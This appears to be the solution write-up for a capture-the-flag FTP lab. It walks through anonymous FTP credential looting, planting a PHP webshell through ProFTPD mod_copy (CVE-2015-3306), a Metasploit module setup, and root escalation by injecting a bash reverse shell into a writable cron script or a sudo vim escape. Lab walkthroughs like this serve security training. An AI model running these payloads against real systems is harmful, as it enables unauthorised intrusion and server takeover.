# ftp-lab — Solution

**Ports:** `2121` (FTP), `8081` (HTTP), `2222` (SSH)

---

## Phase 1: Anonymous FTP enumeration

### Step 1 — Connect as anonymous and list files
```bash
ftp -p -n 127.0.0.1 2121
# Or with curl:
curl --ftp-pasv ftp://anonymous:anon@<target>:2121/
```
You will see:
```
README.txt
backup/
docs/
shared/
```

### Step 2 — Read README.txt
```bash
curl --ftp-pasv ftp://anonymous:anon@<target>:2121/README.txt
```
Mentions an IT backup file.

### Step 3 — Retrieve config.bak
```bash
curl --ftp-pasv ftp://anonymous:anon@<target>:2121/backup/config.bak
```
**Key loot:**
```ini
[ftp]
user=ftpuser
pass=Welc0me2Acme!

[web]
root=/var/www/html
```
Also contains `dbadmin:S3cur3DB2019!` for the database.

---

## Phase 2: Authenticated FTP access

### Step 4 — Log in as ftpuser
```bash
ftp -p -n <target> 2121
# USER ftpuser
# PASS Welc0me2Acme!
```
Or:
```bash
curl --ftp-pasv ftp://ftpuser:Welc0me2Acme\!@<target>:2121/
```
You can now see `user.txt` and `webshell_note.txt` in ftpuser's home.

---

## Phase 3: mod_copy RCE — write a webshell

ProFTPD's `mod_copy` module allows authenticated users to copy files server-side using `SITE CPFR` (source) and `SITE CPTO` (destination). The FTP process runs with write access to `/var/www/html` (Apache web root).

### Step 5 — Create a PHP webshell via CPFR/CPTO

**Using Python ftplib:**
```python
from ftplib import FTP

ftp = FTP()
ftp.connect('<target>', 2121)
ftp.login('ftpuser', 'Welc0me2Acme!')

# Copy the creds file to the web root first to confirm write access
ftp.sendcmd('SITE CPFR /var/ftp/pub/backup/config.bak')
ftp.sendcmd('SITE CPTO /var/www/html/config.txt')
print('Web root write confirmed')
ftp.quit()
```

**Create a PHP webshell directly:**
```python
from ftplib import FTP
import io

ftp = FTP()
ftp.connect('<target>', 2121)
ftp.login('ftpuser', 'Welc0me2Acme!')

# Upload a webshell to the FTP pub area, then copy to web root
shell_content = b'<?php system($_GET["cmd"]); ?>'
ftp.storbinary('STOR /var/ftp/pub/shell.php', io.BytesIO(shell_content))
ftp.sendcmd('SITE CPFR /var/ftp/pub/shell.php')
ftp.sendcmd('SITE CPTO /var/www/html/shell.php')
ftp.quit()
print('Webshell planted')
```

### Step 6 — Execute commands via the webshell
```bash
curl "http://<target>:8081/shell.php?cmd=id"
# uid=33(www-data)

curl "http://<target>:8081/shell.php?cmd=cat+/home/ftpuser/user.txt"
# FLAG{ftp_anon_creds_user_shell}
```

### Metasploit (CVE-2015-3306)
```
use exploit/unix/ftp/proftpd_modcopy_exec
set RHOSTS <target>
set RPORT 2121
set SITEPATH /var/www/html
set TARGETURI /
set LHOST <your_ip>
run
```

---

## Phase 4: Privilege escalation

You now have a shell as `www-data`. Escalate to root.

### Vector A — Writable cron script
```bash
# From web shell:
curl "http://<target>:8081/shell.php?cmd=ls+-la+/opt/maintenance/"
# cleanup.sh is -rwxrwxrwx

# Inject a reverse shell:
curl "http://<target>:8081/shell.php?cmd=echo+'bash+-i+>%26+/dev/tcp/<YOUR_IP>/4444+0>%261'>>+/opt/maintenance/cleanup.sh"
```
Wait up to 60 seconds for cron to fire. Catch with `nc -lvnp 4444`.

### Vector B — sudo vim (ftpuser only)
SSH in first:
```bash
ssh ftpuser@<target> -p 2222   # password: Welc0me2Acme!
sudo /usr/bin/vim -c ':!/bin/bash'
# root shell
```

---

## Flags
| Flag | Location |
|------|----------|
| `FLAG{ftp_anon_creds_user_shell}` | `/home/ftpuser/user.txt` |
| `FLAG{proftpd_modcopy_rce_path}` | `/home/ftpuser/webshell_note.txt` |
| `FLAG{root_via_writable_cron_or_sudo_vim}` | `/root/root.txt` |
